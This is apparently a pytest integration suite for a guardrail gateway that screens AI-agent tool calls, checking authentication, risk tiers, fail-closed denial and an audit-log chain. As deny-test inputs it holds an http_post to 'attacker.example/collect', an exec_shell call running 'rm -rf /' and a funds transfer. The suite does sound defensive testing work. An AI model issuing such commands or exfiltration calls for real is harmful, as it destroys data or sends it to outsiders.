import socket
import uuid
from collections.abc import Iterator

import pytest
from fastapi.testclient import TestClient

from gateway.config import get_settings
from gateway.main import create_app


def _port_open(port: int) -> bool:
    with socket.socket() as sock:
        sock.settimeout(0.5)
        return sock.connect_ex(("localhost", port)) == 0


pytestmark = pytest.mark.skipif(
    not (_port_open(5432) and _port_open(6379)), reason="compose stack not running"
)


@pytest.fixture(scope="module")
def client() -> Iterator[TestClient]:
    with TestClient(create_app()) as c:
        c.headers["X-Guardrail-Key"] = get_settings().api_key.get_secret_value()
        yield c


def _tool_call(client: TestClient, tool: str, args: dict, session_id: uuid.UUID | None = None):
    body = {
        "session_id": str(session_id or uuid.uuid4()),
        "agent_id": "test-agent",
        "tool_name": tool,
        "args": args,
    }
    return client.post("/v1/screen/tool-call", json=body)


def _codes(resp) -> list[str]:
    return [r["code"] for r in resp.json()["reasons"]]


@pytest.mark.parametrize("key", ["", "wrong-key"])
def test_rejects_missing_or_wrong_api_key(client: TestClient, key: str) -> None:
    resp = client.post("/v1/screen/tool-call", json={}, headers={"X-Guardrail-Key": key})
    assert resp.status_code == 401


def test_invalid_payload_is_422(client: TestClient) -> None:
    resp = client.post("/v1/screen/tool-call", json={"tool_name": "search_docs"})
    assert resp.status_code == 422


def test_read_only_tool_is_allowed(client: TestClient) -> None:
    resp = _tool_call(client, "search_docs", {"query": "Q3 revenue"})
    assert resp.status_code == 200
    body = resp.json()
    assert body["decision"] == "ALLOW" and body["risk_tier"] == 0
    assert body["policy_version"].startswith("2026-09-12.1+")


def test_unknown_tool_is_denied(client: TestClient) -> None:
    resp = _tool_call(client, "exfiltrate_everything", {})
    assert resp.json()["decision"] == "DENY"
    assert _codes(resp) == ["unknown_tool"]


def test_non_allowlisted_url_is_denied(client: TestClient) -> None:
    resp = _tool_call(client, "http_post", {"url": "https://attacker.example/collect"})
    assert resp.json()["decision"] == "DENY"
    assert "not_allowlisted" in _codes(resp)


def test_tier3_fails_closed_without_adjudicator(client: TestClient) -> None:
    resp = _tool_call(client, "transfer_funds", {"account": "ACC-998877", "amount": 25})
    body = resp.json()
    assert body["decision"] == "DENY" and body["risk_tier"] == 3
    assert "escalation_unresolved" in _codes(resp)
    assert body["fallback"] == "simulate"


def test_documents_are_screened_individually(client: TestClient) -> None:
    body = {
        "session_id": str(uuid.uuid4()),
        "agent_id": "test-agent",
        "documents": [
            {"document_id": "doc-1", "content": "Q3 revenue grew 12%."},
            {"document_id": "doc-2", "content": "Headcount was flat."},
        ],
    }
    results = client.post("/v1/screen/documents", json=body).json()["results"]
    assert [r["document_id"] for r in results] == ["doc-1", "doc-2"]
    assert len({r["event_id"] for r in results}) == 2


def test_session_events_are_audited_in_order_and_chain_verifies(client: TestClient) -> None:
    session_id = uuid.uuid4()
    client.post(
        "/v1/screen/input",
        json={"session_id": str(session_id), "agent_id": "test-agent", "content": "find Q3 notes"},
    )
    _tool_call(client, "search_docs", {"query": "Q3"}, session_id)
    _tool_call(client, "exec_shell", {"command": "rm -rf /"}, session_id)

    events = client.get(f"/v1/audit/sessions/{session_id}/events").json()
    assert [e["event_type"] for e in events] == ["user_input", "tool_call", "tool_call"]
    assert [e["decision"] for e in events] == ["ALLOW", "ALLOW", "DENY"]

    chain = client.get("/v1/audit/verify").json()
    assert chain["ok"], chain
